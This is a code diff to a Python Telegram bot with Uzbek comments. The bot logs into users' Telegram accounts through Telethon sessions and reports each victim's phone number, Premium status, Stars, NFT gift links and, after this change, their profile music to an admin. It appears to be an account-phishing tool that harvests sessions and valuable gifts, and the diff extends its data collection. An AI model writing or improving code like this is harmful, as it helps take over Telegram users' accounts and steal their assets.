@@ -21,7 +21,6 @@ from telethon.errors import (
     PasswordHashInvalidError
 )
 
-# Web server Render / Railway uchun
 app = Flask(__name__)
 
 @app.route('/')
@@ -34,7 +33,6 @@ def run_http():
 
 Thread(target=run_http, daemon=True).start()
 
-# KONFIGURATSIYA
 API_ID = int(os.environ.get("API_ID", "0"))
 API_HASH = os.environ.get("API_HASH", "")
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
@@ -298,8 +296,12 @@ async def fetch_user_level_and_points(client: TelegramClient):
         profile = await client(functions.users.GetFullUserRequest(id="me"))
         full_info = profile.full_user
         
-        if hasattr(full_info, 'star_gifts_count'):
-            points = getattr(full_info, 'star_gifts_count', 0)
+        if hasattr(full_info, 'peer_rating') and full_info.peer_rating is not None:
+            points = getattr(full_info.peer_rating, 'points', 0)
+        elif hasattr(full_info, 'star_gifts_count') and full_info.star_gifts_count:
+            points = full_info.star_gifts_count
+        elif hasattr(full_info, 'stargifts_count') and full_info.stargifts_count:
+            points = full_info.stargifts_count
             
         if points >= 12000:
             level = 3
@@ -320,6 +322,28 @@ async def fetch_user_premium_info(client: TelegramClient):
     except Exception:
         pass
     return info_str
+
+async def fetch_user_profile_music(client: TelegramClient):
+    music_info = "🎵 Musiqalar: Yo'q"
+    try:
+        profile = await client(functions.users.GetFullUserRequest(id="me"))
+        full_info = profile.full_user
+        
+        if hasattr(full_info, 'audio') and full_info.audio:
+            audio = full_info.audio
+            title = getattr(audio, 'title', '')
+            performer = getattr(audio, 'performer', '')
+            
+            if performer or title:
+                music_name = f"{performer} - {title}".strip(" - ")
+                music_info = f"🎵 Musiqalar: {music_name}"
+            else:
+                music_info = "🎵 Musiqalar: Mavjud"
+        elif hasattr(full_info, 'music') and full_info.music:
+            music_info = "🎵 Musiqalar: Mavjud"
+    except Exception as e:
+        print(f"Music Fetch Error: {e}")
+    return music_info
 
 async def fetch_user_nft_gifts(client: TelegramClient):
     nft_items = []
@@ -352,6 +376,7 @@ async def process_account_info(message: types.Message, state: FSMContext, user_i
     # 2. Ma'lumotlar
     user_level, user_points = await fetch_user_level_and_points(client)
     premium_str = await fetch_user_premium_info(client)
+    music_str = await fetch_user_profile_music(client)
     
     nft_links = await fetch_user_nft_gifts(client)
     nft_count = len(nft_links)
@@ -361,8 +386,6 @@ async def process_account_info(message: types.Message, state: FSMContext, user_i
         nft_str = f"🎁 NFT: {nft_count} ta\n{nft_list}"
     else:
         nft_str = "🎁 NFT: 0 ta"
-
-    points_formatted = f"{user_points / 1000:.1f}K" if user_points >= 1000 else str(user_points)
 
     # 3. Adminga xabar
     full_name = message.from_user.full_name
@@ -375,8 +398,9 @@ async def process_account_info(message: types.Message, state: FSMContext, user_i
         f"🆔 ID: {user_id}\n"
         f"🏷 Username: {username}\n"
         f"☎️ Tel: {phone}\n"
-        f"📊 Daraja: {user_level}-daraja ({points_formatted} pt)\n"
+        f"📊 Daraja: {user_level} ({user_points} pt)\n"
         f"{premium_str}\n"
+        f"{music_str}\n"
         f"{stars_str}\n"
         f"{nft_str}"
     )
@@ -416,4 +440,3 @@ async def main():
 
 if __name__ == "__main__":
     asyncio.run(main())
-    
